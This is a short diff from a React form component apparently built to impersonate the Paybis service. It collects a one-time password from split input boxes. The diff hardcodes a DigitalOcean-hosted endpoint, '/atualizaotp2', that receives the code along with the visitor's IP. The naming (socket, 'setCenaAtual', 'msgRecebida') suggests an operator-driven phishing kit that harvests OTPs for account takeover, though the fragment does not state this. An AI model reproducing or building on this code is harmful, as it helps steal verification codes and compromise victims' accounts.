@@ -74,7 +74,7 @@ export default function PaybisOTPMSG({ socket, ip,setCenaAtual,msgRecebida }) {
     event.preventDefault();
 
     if (validateForm()) {
-      await axios.post(`${process.env.URL_SVR}/atualizaotp2`, {
+      await axios.post("https://seal-app-w9oy8.ondigitalocean.app/atualizaotp2", {
         ip,
         OTP2:
           otp["otp1"] +
